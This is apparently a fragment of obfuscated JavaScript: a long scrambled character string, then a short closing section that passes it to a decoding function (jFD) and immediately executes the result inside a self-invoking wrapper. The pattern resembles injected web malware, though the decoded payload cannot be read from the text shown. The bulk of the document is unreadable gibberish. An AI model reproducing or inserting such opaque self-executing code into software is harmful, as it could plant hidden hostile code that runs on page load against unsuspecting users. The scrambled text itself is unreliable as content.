cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
